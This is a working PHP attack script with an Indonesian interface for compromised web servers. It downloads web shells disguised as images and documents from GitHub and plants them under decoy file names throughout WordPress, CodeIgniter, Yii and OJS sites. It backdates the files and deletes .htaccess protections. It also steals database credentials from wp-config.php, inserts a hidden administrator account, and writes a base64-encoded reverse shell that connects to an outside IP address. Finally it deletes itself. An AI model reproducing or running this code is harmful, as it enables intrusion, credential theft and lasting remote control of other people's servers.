<link rel="stylesheet" href="https://do124574.github.io/main.css">
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
		<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<link rel="stylesheet" href="https://do124574.github.io/stylex.css">
<?php	
		set_time_limit(0);
		error_reporting(0);


// wp
$enx0 = array("index.php","wp-login.php","xmlrpc.php","edit-form-advanced.php","link-parse-opml.php","ms-sites.php","options-writing.php","themes.php","https.php","class-https.php","admin-ajax.php","edit-form-comment.php","link.php","ms-themes.php","_Document.php","plugin-editor.php","admin-footer.php","edit-link-form.php","registration-functions.php","load-scripts.php","ms-upgrade-network.php","admin-functions.php","edit.php","load-styles.php","ms-users.php","plugins.php","admin-header.php","licenses.php","edit-tag-form.php","media-new.php","my-sites.php","apps.php","post-new.php","upgrade-themes.php","sandwich.php","edit-tags.php","noop.php","media.php","nav-menus.php","posts.php","admin-post.php","Document.php","export.php","Note.php","media-upload.php","network.php","press-this.php","upload.php","async-upload.php","menu-header.php","options-discussion.php","privacy.php","user-edit.php","menu.php","options-general.php","profile.php","user-new.php","moderation.php","options-head.php","revision.php","users.php","custom-background.php","ms-admin.php","options-media.php","setup-config.php","widgets.php","theme-single.php","custom-header.php","ms-delete-site.php","options-permalink.php","term.php","customize.php","link-add.php","supre.php","ms-edit.php","options.php","edit-comments.php","link-manager.php","ms-options.php","options-reading.php","xmlrpc.php","comments.php","front-page.php","home.php","redy.php","header.php","index.php","singular.php","single.php","single-wordpress.php","page.php","category.php","tag.php","taxonomy.php","author.php","date.php","archive.php","search.php","attachment.php","image.php","404.php","https.php","redy.php","class-wp-customize-nav-menu-customize.php","footer_backup.php","header_backup.php");


// bebas
$enx1 = array("index.php","https.php","noop.php","supre.php","Document.php","class-wp-customize-nav-menu-customize.php","Note.php","redy.php","_Document.php","footer_backup.php","header_backup.php","apps.php");

// ci
$enx2 = array("index.php","DB_utility.php","postgre_driver.php","postgre_result.php","postgre_forge.php","postgre_utility.php","sqlsrv_forge.php","sqlsrv_driver.php","sqlsrv_result.php","sqlsrv_utility.php","pdo_odbc_driver.php","pdo_4d_driver.php","pdo_sqlsrv_driver.php","pdo_sqlite_forge.php","pdo_oci_forge.php","pdo_dblib_forge.php","pdo_cubrid_forge.php","pdo_dblib_driver.php","pdo_pgsql_driver.php","pdo_pgsql_forge.php","pdo_ibm_forge.php","pdo_informix_driver.php","pdo_mysql_driver.php","pdo_4d_forge.php","pdo_oci_driver.php","pdo_ibm_driver.php","pdo_sqlite_driver.php","pdo_mysql_forge.php","pdo_cubrid_driver.php","pdo_sqlsrv_forge.php","pdo_firebird_forge.php","pdo_odbc_forge.php","pdo_informix_forge.php","pdo_firebird_driver.php","pdo_forge.php","pdo_result.php","pdo_utility.php","pdo_driver.php","sqlite_driver.php","sqlite_result.php","sqlite_utility.php","sqlite_forge.php","cubrid_driver.php","cubrid_result.php","cubrid_utility.php","cubrid_forge.php","oci8_utility.php","oci8_result.php","oci8_driver.php","oci8_forge.php","odbc_result.php","odbc_utility.php","odbc_driver.php","odbc_forge.php","sqlite3_forge.php","sqlite3_utility.php","sqlite3_result.php","sqlite3_driver.php","mysql_result.php","mysql_utility.php","mysql_driver.php","mysql_forge.php","mysqli_result.php","mysqli_forge.php","mysqli_driver.php","mysqli_utility.php","ibase_utility.php","ibase_forge.php","ibase_driver.php","ibase_result.php","mssql_forge.php","mssql_utility.php","mssql_driver.php","mssql_result.php","DB_forge.php","DB_result.php","DB.php","DB_driver.php","DB_cache.php","DB_query_builder.php","Lang.php","Loader.php","Hooks.php","Controller.php","hash.php","standard.php","mbstring.php","password.php","https.php","_Document.php","noop.php","supre.php","Document.php","redy.php","footer_backup.php","header_backup.php","apps.php");


// yii 
$enx3 = array("index.php","NotInstantiableException.php","LogicalAndToken.php","Friend.php","Tilde.php","SchemaBuilderTrait.php","InvalidEmail.php","UnstructuredHeader.php","ArrayRecipientIterator.php","FileFixtureTrait.php","AccessRule.php","UrlLinkTrait.php","ConditionalAssertionFailed.php","Barcode.php","CallableTypeTest.php","Endfor.php","MigrateController.php","AssertionFailedError.php","SerialColumn.php","MockClass.php","SiteController.php","Json.php","AggregatedType.php","Forms.php","Exit.php","Authenticator.php","MethodNotExtendableException.php","MultiFieldSession.php","DoctrineProvider.php","ManifestLoader.php","ProphecyInterface.php","LongestCommonSubsequenceTest.php","DataProviderInterface.php","ExclamationMark.php","LimitStream.php","HitReporter.php","MailEvent.php","ExtElement.php","ElementCollection.php","Local.php","Toast.php","BaseMarkdownTest.php","AbstractNode.php","LinkSorter.php","Invocation.php","QuotedPart.php","LoginFormCest.php","TransportExceptionListener.php","TypeComparator.php","MagicCallPatch.php","MessageInterface.php","Argument.php","ObsoleteDTEXT.php","IdnAddressEncoder.php","CheckConstraint.php","MatcherInterface.php","from.windows-1256.php","LocalOrReservedDomain.php","toolbar.php","CloverTest.php","FontFamily.php","RequestPanel.php","CloseSquare.php","DNumber.php","PdoValueBuilder.php","DefaultPhpProcess.php","Inc.php","DisplayLinkURI.php","ManifestDocumentMapper.php","BaseTag.php","StringHelper.php","Block.php","Inflector.php","EachValidator.php","UnintentionallyCoveredCodeError.php","IsNotIdentical.php","SuiteSubscriber.php","DoctrineEmptyCollectionFilter.php","UserSearchInterface.php","PhoneNumber.php","ClosureContext.php","SpecificMajorAndMinorVersionConstraint.php","PassthroughFormatter.php","DoubleComparatorTest.php","DbCache.php","SyntheticError.php","DeleteAction.php","TextTestListRenderer.php","ExtensionNotFound.php","Cest.php","User.php","SameSize.php","ActiveQueryTrait.php","ExpressionInterface.php","EventPanel.php","https.php","_Document.php","noop.php","supre.php","Document.php","redy.php","footer_backup.php","header_backup.php","apps.php");

// ojs
$enx4 = array("index.php","SectionGridHandler.inc.php","AbstractBlock.php","RegisterListenersPassTest.php","SubmissionAuthorPolicy.inc.php","RoutingServiceProvider.php","smarty_internal_compile_for.php","SecurityException.php","PostgreSqlSchemaManager.php","ViewsMigration.inc.php","RouteDependencyResolverTrait.php","SessionUtils.php","ResponseStreamInterface.php","AbstractHasher.php","Renderable.php","ProfilerListener.php","ReviewsMigration.inc.php","PKPAnnouncementsListPanel.inc.php","Role.inc.php","WorkflowHandler.inc.php","Scope.php","PKPSiteService.inc.php","sah_RU.php","RemoveSpansWithoutAttributes.php","RelationNotFoundException.php","shi.php","smarty_internal_resource_eval.php","ThematicBreak.php","SessionValueResolver.php","StaticPagesHandler.inc.php","SluggerInterface.php","smarty_internal_runtime_make_nocache.php","smarty_internal_method_registerdefaultconfighandler.php","SchemaColumnDefinitionEventArgs.php","RequestValueResolver.php","PKPEmailTemplateForm.inc.php","Registry.inc.php","QueryAssignedToUserAccessPolicy.inc.php","Stack.php","twq.php","RestCompletePurchaseRequest.php","SectionDAO.inc.php","View.php","AbstractRestRequest.php","RequestDecorator.php","PrivateFileManager.inc.php","smarty_internal_compile_make_nocache.php","RouteConfigurator.php","ResourceCaster.php","vi.php","SymfonyStyle.php","smarty_internal_smartytemplatecompiler.php","TLD.php","UploadedFile.php","RC4.php","PhpDateTimeMappingType.php","ReportGeneratorForm.inc.php","PKPSubmissionHandler.inc.php","RootViolationException.php","SimpleArrayType.php","Sort.php","UrlGenerationException.php","smarty_resource.php","SortableIterator.php","smarty_internal_method_registerfilter.php","SubmissionKeywordEntryDAO.inc.php","https.php","_Document.php","noop.php","supre.php","Document.php","redy.php","footer_backup.php","header_backup.php","apps.php");

$itemsxz = array("https://raw.githubusercontent.com/do124574/do124574/main/licenses.png", "https://raw.githubusercontent.com/do124574/do124574/main/class-wp-customize-nav-menu-customize.png", "https://raw.githubusercontent.com/do124574/do124574/main/Note.png", "https://raw.githubusercontent.com/do124574/do124574/main/supre.png", "https://github.com/do124574/do124574/raw/main/raw1.pdf", "https://github.com/do124574/do124574/raw/main/raw2.pdf","https://raw.githubusercontent.com/do124574/do124574/main/apps.png","https://raw.githubusercontent.com/do124574/do124574/main/2022.docx");


 // files
$sox = "JGNodW5rX3NpemU9MTQwMDskd3JpdGVfYT1udWxsOyRlcnJvcl9hPW51bGw7JHNoZWxsPSd1bmFtZSAtYTsgdzsgaWQ7IC9iaW4vc2ggLWknOyRkYWVtb249MDskZGVidWc9MDtpZihmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSl7JHBpZD1wY250bF9mb3JrKCk7aWYoJHBpZD09LTEpe3ByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7ZXhpdCgxKTt9aWYoJHBpZCl7ZXhpdCgwKTt9aWYocG9zaXhfc2V0c2lkKCk9PS0xKXtwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTtleGl0KDEpO30kZGFlbW9uPTE7fWVsc2V7cHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7fWNoZGlyKCIvIik7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCRpcCwkcG9ydCwkZXJybm8sJGVycnN0ciwzMCk7aWYoISRzb2NrKXtwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7ZXhpdCgxKTt9JGRlc2NyaXB0b3JzcGVjPWFycmF5KDA9PmFycmF5KCJwaXBlIiwiciIpLDE9PmFycmF5KCJwaXBlIiwidyIpLDI9PmFycmF5KCJwaXBlIiwidyIpKTskcHJvY2Vzcz1wcm9jX29wZW4oJHNoZWxsLCRkZXNjcmlwdG9yc3BlYywkcGlwZXMpO2lmKCFpc19yZXNvdXJjZSgkcHJvY2Vzcykpe3ByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpO2V4aXQoMSk7fXN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7cHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpO3doaWxlKDEpe2lmKGZlb2YoJHNvY2spKXtwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7YnJlYWs7fWlmKGZlb2YoJHBpcGVzWzFdKSl7cHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpO2JyZWFrO30kcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pOyRudW1fY2hhbmdlZF9zb2NrZXRzPXN0cmVhbV9zZWxlY3QoJHJlYWRfYSwkd3JpdGVfYSwkZXJyb3JfYSxudWxsKTtpZihpbl9hcnJheSgkc29jaywkcmVhZF9hKSl7aWYoJGRlYnVnKXByaW50aXQoIlNPQ0sgUkVBRCIpOyRpbnB1dD1mcmVhZCgkc29jaywkY2h1bmtfc2l6ZSk7aWYoJGRlYnVnKXByaW50aXQoIlNPQ0s6ICRpbnB1dCIpO2Z3cml0ZSgkcGlwZXNbMF0sJGlucHV0KTt9aWYoaW5fYXJyYXkoJHBpcGVzWzFdLCRyZWFkX2EpKXtpZigkZGVidWcpcHJpbnRpdCgiU1RET1VUIFJFQUQiKTskaW5wdXQ9ZnJlYWQoJHBpcGVzWzFdLCRjaHVua19zaXplKTtpZigkZGVidWcpcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTtmd3JpdGUoJHNvY2ssJGlucHV0KTt9aWYoaW5fYXJyYXkoJHBpcGVzWzJdLCRyZWFkX2EpKXtpZigkZGVidWcpcHJpbnRpdCgiU1RERVJSIFJFQUQiKTskaW5wdXQ9ZnJlYWQoJHBpcGVzWzJdLCRjaHVua19zaXplKTtpZigkZGVidWcpcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTtmd3JpdGUoJHNvY2ssJGlucHV0KTt9fWZjbG9zZSgkc29jayk7ZmNsb3NlKCRwaXBlc1swXSk7ZmNsb3NlKCRwaXBlc1sxXSk7ZmNsb3NlKCRwaXBlc1syXSk7cHJvY19jbG9zZSgkcHJvY2Vzcyk7ZnVuY3Rpb24gcHJpbnRpdCgkc3RyaW5nKXtpZighJGRhZW1vbil7cHJpbnQiJHN0cmluZ1xuIjt9fQ";


			$direktori = $_SERVER['DOCUMENT_ROOT'];
			$fullxx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "", $direktori);
			
			echo "<hr><br>";
			echo '
				<center><h2>Tebar Pesona Yuk!</h2>
				<br>
				<form action="" method="post">
					<center>  
					 <br>
						<select name="modex" class="form-control" style="width: 250px; height: 40px;">
							<option value="standard">Wordpress</option>
							<option value="random">Signature</option>
							<option value="cii">CodeIgniter</option>
							<option value="yii">YII</option>
							<option value="ojs">OJS</option>
						</select><br>
						<input class="form-control" type="text" name="direktorix" value="'.$direktori.'" style="width: 450px;" height="10"><br>
						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Tebar" name="tebar" />

						
				</form><br></center>
				';
			if (isset($_POST['tebar'])) {
				$modeio = $_POST['modex'];
				$folderio = $_POST['direktorix'];

				$gsc = "Z29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiBnb29nbGViZGM2Mzc4MTJmZDk5NzIyLmh0bWw=";
                        file_put_contents($direktori."googlebdc637812fd99722.html", base64_decode($gsc));
				echo "<code>";
				

        		$resource1 = "https://raw.githubusercontent.com/do124574/do124574/main/licenses.png";
        		$resource2 = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";


	                     if (is_writable($direktori)) {
							if (!is_dir($direktori .'/.well-known/pki-validation/.../')) { mkdir($direktori . '/.well-known/pki-validation/.../', 0755, true); }	
							$lapor9	= $direktori.'/.well-known/pki-validation/.../index.php';
							$report9 = file_get_contents($itemsxz[1]); file_put_contents($lapor9, $report9); 
							if (file_exists($lapor9) && filesize($lapor9) > 0) {
								echo "<a href='//".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php' target='_blank'>".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php</a><br>";
								@touch($lapor9, strtotime('-'.rand(30,90).' days', time()));	
							}
							
							if (!is_dir($direktori .'/-./')) { mkdir($direktori . '/-./', 0755, true); }	
							$lapor5	= $direktori.'/-./_report.pdf';
							$report5 = file_get_contents($itemsxz[1]); file_put_contents($lapor5, $report5); 
							if (file_exists($lapor5) && filesize($lapor5) > 0) {
								echo "<a href='//".$_SERVER['HTTP_HOST']."/-./_report.pdf' target='_blank'>".$_SERVER['HTTP_HOST']."/-./_report.pdf</a><br>"; 
								@touch($lapor5, strtotime('-'.rand(30,90).' days', time()));
							}

							$lteamm	= $direktori.'/-./_report.php';
							$rteamm = file_get_contents('https://github.com/do124574/do124574/raw/main/mr.psd'); file_put_contents($lteamm, $rteamm); 
							if (file_exists($lapor5) && filesize($lteamm) > 0) {
								echo "<a href='//".$_SERVER['HTTP_HOST']."/-./_report.php' target='_blank'>".$_SERVER['HTTP_HOST']."/-./_report.php</a><br>"; 
								@touch($lapor5, strtotime('-'.rand(30,90).' days', time()));
							}


						}

                if ($folderio) {

                	$lapor8 = $folderio.'/wp-config.php';
                    if (file_exists($lapor8)) {
    
                        $lapor1 = $folderio.'/.tmb/index.php';
                        $lapor2 = $folderio.'/wp-content/upgrade/_Document.php';
                        $lapor3 = $folderio.'/wp-content/uploads/'.date("Y").'/'.date("n").'/supre.php';
                        $lapor4 = $folderio.'/licenses.php';
                        $lapor10 = $folderio.'/wp-admin/Note.php';
                        $lapor6 = $folderio.'/wp-includes/class-wp-customize-nav-menu-customize.php';
                        $lapor7 = $folderio.'/wp-config-sample.php';
                        $lapor11 = $folderio.'/wp-content/plugin-editor.php';
                        $lapor12 = $folderio.'/wp-content/plugins/index.php';
                        
                        $laporanz = array($lapor1, $lapor4, $lapor10, $lapor6, $lapor7, $lapor10, $lapor11, $lapor12);
                         
                        $lapor9 = $folderio.'/.well-known/pki-validation/.../index.php';

                        $penanggalan = date("Y").'/'.date("n");
                       	if (is_writable($folderio)) {    
	                        if (!is_dir($folderio .'/.tmb')) { mkdir($folderio . '/.tmb', 0755, true); }
	                        if (!is_dir($folderio .'/wp-includes')) { mkdir($folderio . '/wp-includes', 0755, true); }
	                        if (!is_dir($folderio .'/wp-admin')) { mkdir($folderio . '/wp-admin', 0755, true); }
	                        if (!is_dir($folderio .'/wp-content/upgrade')) { mkdir($folderio . '/wp-content/upgrade', 0755, true); }
	                        if (!is_dir($folderio .'/.well-known/pki-validation')) { mkdir($folderio . '/.well-known/pki-validation/...', 0755, true); }                
	                        if (!is_dir($folderio .'/wp-content/uploads/'.$penanggalan)) { mkdir($folderio . '/wp-content/uploads/'.$penanggalan, 0755, true); }
                    	}

                    	$i = 0;
                    	


                        foreach (scandir($folderio) as $detailsfolderx) {
	                        $wpfolder = $folderio.DIRECTORY_SEPARATOR.$detailsfolderx;
	                        if (is_dir($wpfolder) && $detailsfolderx != "." && $detailsfolderx != "..") {   
	                        	
	                        	if (is_writable($wpfolder)) {
	                        		

	                        		if (file_exists($wpfolder.'/.htaccess') && $wpfolder != "-.") {
											chmod($wpfolder.'/.htaccess', 0644 );
											unlink($wpfolder.'/.htaccess');
										}


		                        	if ($detailsfolderx === "wp-content") {
		                        		if (file_exists($folderio.'/wp-content/.htaccess')) {
									    	chmod($folderio.'/wp-content/.htaccess', 0644 );
									    	unlink($folderio.'/wp-content/.htaccess');
										}
										if (file_exists($folderio.'/wp-content/.htaccess')) {
				                        	chmod($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess', 0644 );
				                        	unlink($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess');
				                    	}

				                        if (file_exists($folderio.'/wp-content/.htaccess')) {
				                        	chmod($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess', 0644 );
				                        	unlink($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess');
				                        }

				                        if (file_exists($folderio.'/wp-content/.htaccess')) {
				                        	unlink($folderio.'/wp-content/.htaccess');
				                    	}
				                        
				                        
				                        $report200 = file_get_contents($itemsxz[2]); file_put_contents($lapor2, $report200); @touch($lapor2, strtotime('-'.rand(30,90).' days', time()));        
                        				$report300 = file_get_contents($itemsxz[3]); file_put_contents($lapor3, $report300); @touch($lapor3, strtotime('-'.rand(30,90).' days', time())); 
                        				if (file_exists($lapor2) && filesize($lapor2) > 0) {
                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."</a><br>";
                        				}
                        				if (file_exists($lapor3) && filesize($lapor3) > 0) {
                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
                        				}
                        			  
									}
											
                                     
										
									if (!file_exists($laporanz[$i])){
										$report = file_get_contents($itemsxz[$i]); file_put_contents($laporanz[$i], $report); @touch($laporanz[$i], strtotime('-'.rand(30,90).' days', time())); 
										if (file_exists($laporanz[$i]) && filesize($laporanz[$i]) > 0) {
											echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanz[$i])."''>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanz[$i])."</a><br>";
										}
									}	
										
										switch ($modeio) {
										  case standard:
										    $namafilenx = $enx0[array_rand($enx0)];
										    break;
										  case cii:
										    $namafilenx = $enx2[array_rand($enx2)];
										    break;
										  case yii:
										    $namafilenx = $enx3[array_rand($enx3)];
										    break;
										  case ojs:
										    $namafilenx = $enx4[array_rand($enx4)];
										  default:
										    $namafilenx = $enx1[array_rand($enx1)];
										}



                                        $laporanzx = $wpfolder.DIRECTORY_SEPARATOR.$namafilenx;
                                        
                                     	
                                        $sourcezx = $itemsxz[array_rand($itemsxz)];
                                       
                                        if (!file_exists($laporanzx)){
	                                        $reportx = file_get_contents($sourcezx); file_put_contents($laporanzx, $reportx); @touch($laporanzx, strtotime('-'.rand(30,90).' days', time()));
	                                        if (file_exists($laporanzx) && filesize($laporanzx) > 0) {
												echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanzx)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanzx)."</a><br>";
												
											}
										} 
										
										$i++;
									
									
	                        	} 

	                        } 
	                        
	                     }

                    	

      					if (is_dir($folderio.'/wp-includes/IXR/') && is_writable($folderio.'/wp-includes/IXR/')) {  
                            $lapor13 = $folderio.'/wp-includes/IXR/supre.php';
                            $report13 = file_get_contents($resource2); file_put_contents($lapor13, $report13); @touch($lapor13, strtotime('-'.rand(30,90).' days', time()));
                            if (file_exists($lapor13) && filesize($lapor13) > 0) {
	                        	echo "<br>Adminer: ";
	                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor13)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor13)."</a>";
	                        	echo "<br>WP: ".$folderio;
	                        }
                         
                        }



 
 						$lapor8900 = $folderio.'/wp-config.php';
							if (file_exists($lapor8900)) {
								$cxz = file_get_contents($lapor8900);

								preg_match('/define.*DB_NAME.*\'(.*)\'/', $cxz, $mxz);
								$dbname = $mxz[1];

								preg_match('/define.*DB_USER.*\'(.*)\'/', $cxz, $mxz);
								$dbuser = $mxz[1];

								preg_match('/define.*DB_PASSWORD.*\'(.*)\'/', $cxz, $mxz);
								$dbpass = $mxz[1];

								preg_match('/define.*DB_HOST.*\'(.*)\'/', $cxz, $mxz);
								$dbhost = $mxz[1];

								preg_match('/table_prefix.*=.*\'(.*)\'/', $cxz, $mxm);
								$table_prefix = $mxm[1];
	
								if (isset($dbname)) {
								echo "<br>DB Name: ".$dbname;
								echo " - DB Host: ".$dbhost;
								echo "<br>DB User: ".$dbuser;
								echo " - DB Pass: ".$dbpass;
								
								
								}

								if (isset($table_prefix)) {
									$conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
									if ($conn->connect_error) { echo ""; } else {

									$passw0rd = generateRandomString();

									$sql = "INSERT INTO ".$table_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('99899', '$dbuser', MD5('".$passw0rd."'), '$dbname', 'wagimanasek@gmail.com', 'http://www.google.com/', '2018-06-07 00:00:00', '', '0', '$dbname');";
									$sql .= "INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '99899', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');";
									$sql .= "INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '99899', '".$table_prefix."user_level', '10');";

										if ($conn->multi_query($sql) === TRUE) {
											  echo "<br>U: ".$dbname." P: ".$passw0rd;
											} 

									$conn -> close();
									}

								} 
							} 

				

              


					} else {

                        
                        		$i = 0;
                                foreach (scandir($folderio) as $detailsfolder) {
                                	$nonwpfolder = $folderio.DIRECTORY_SEPARATOR.$detailsfolder;
                                   
                                                                    
                                    if(is_dir($nonwpfolder) and $detailsfolder != "." && $detailsfolder != "..") {                            

                                        if (is_writable($nonwpfolder)) {
                                            
                                            if (file_exists($nonwpfolder.'/.htaccess' && $nonwpfolder != "-.")) {
                                            chmod($nonwpfolder.'/.htaccess', 0644 );
                                            unlink($nonwpfolder.'/.htaccess');
                                            }
                                            if ($detailsfolder === 'docs') {
                                                if (!is_dir($nonwpfolder .'/manual/')) { mkdir($nonwpfolder . '/manual/', 0755, true); }
                                                $lapor1 = $nonwpfolder.'/manual/index.php';
                                                $report1 = file_get_contents($resource1); file_put_contents($lapor1, $report1); @touch($lapor1, strtotime('-'.rand(30,90).' days', time()));
                                                if (file_exists($lapor1) && filesize($lapor1) > 0) {
                                                	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor1)."</a><br>";
                                                } 
                                            }
                                            if ($detailsfolder === 'public') {
                                                if (!is_dir($nonwpfolder .'/.../')) { mkdir($nonwpfolder . '/.../', 0755, true); }
                                                $lapor2 = $nonwpfolder.'/.../index.php';
                                                $report2 = file_get_contents($resource1); file_put_contents($lapor2, $report2); @touch($lapor2, strtotime('-'.rand(30,90).' days', time()));
                                                if (file_exists($lapor2) && filesize($lapor2) > 0) {
                                                	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor2)."</a><br>"; 
                                            	}
                                            }
                                            	
                                                if (is_array($itemsxz) || is_object($itemsxz)) {
                                                         
                                                        switch ($modeio) {
														  case standard:
														    $namafilenx = $enx0[array_rand($enx0)];
														    break;
														  case cii:
														    $namafilenx = $enx2[array_rand($enx2)];
														    break;
														  case yii:
														    $namafilenx = $enx3[array_rand($enx3)];
														    break;
														  case ojs:
														    $namafilenx = $enx4[array_rand($enx4)];
														  default:
														    $namafilenx = $enx1[array_rand($enx1)];
														}

                                                        $lapor3 = $nonwpfolder.DIRECTORY_SEPARATOR.$namafilenx;
                                                
				                               
                                                   if (!file_exists($lapor3)) {     
		                                            for ($i=0; $i< count($itemsxz); $i++ ) {
																if(($i+1)<=11) {

		                                                        	$getcontentsource = $itemsxz[$i]; 
		                                                        	$report3 = file_get_contents($getcontentsource); file_put_contents($lapor3, $report3); 
		                                                        } else { 
		                                                        	$key = array_rand($itemsxz);
		                                                        	$getcontentsource = $itemsxz[$key]; 
		                                                        	$report3 = file_get_contents($getcontentsource); file_put_contents($lapor3, $report3); 
		                                                        }
		                                            }

                                                        if (file_exists($lapor3) && filesize($lapor3) > 0 ) {
	                                                        @touch($lapor3, strtotime('-'.rand(30,90).' days', time())); 
	                                                        @touch($nonwpfolder, strtotime('-'.rand(30,90).' days', time()));
	                                                        chmod($lapor3, 0644 );
	                                                       
	                                                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
	                                                        	
	                                                   		

	                                                    }
	                                            	}
	                                                    
	                                              
	                                                    
                                                        
                                                    
                                                    
                                                }   
                                            
                                        }
                                }   


                            

                        
						}


					}
				}	

				        $htaccessxz = $direktori."/-./.htaccess";
                        if (!file_exists($htaccessxz)) { 
    					
						    $contentx = 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRmCk9wdGlvbnMgLUluZGV4ZXMKPEZpbGVzTWF0Y2ggIi4qXC4ocHl8c2h0bWx8cGh0bWx8cGhwfFBIUHxQaHB8UEhwfHBIcHxwSFB8cGhQfFBoUHxwaHA1fHBocDcpJCI+Ck9yZGVyIEFsbG93LERlbnkKRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICdeKGluZGV4LnBocHxfcmVwb3J0LnBocCkkJz4KT3JkZXIgYWxsb3csZGVueQpBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+';
						    $contentx = base64_decode($contentx);
						    @file_put_contents($htaccessxz, $contentx);

						}
					
			
				$soxx = $direktori."/-./index.php";
			if(file_exists($soxx)) { unlink($soxx); } 
			$src_='';
			$src_.='<?php ';
			$src_.="set_time_limit(0); \$ip='51.79.241.133'; \$port=5433;";
			$src_.=base64_decode($sox);
			$src_.=' ?>';
			file_put_contents($soxx, $src_);
			@touch($soxx, strtotime('-'.rand(30,90).' days', time()));
			echo "<br>PHP Sockets: <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $soxx)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $soxx)."</a><br>";
			echo "</code>";

			@unlink(__FILE__);

			}

			?>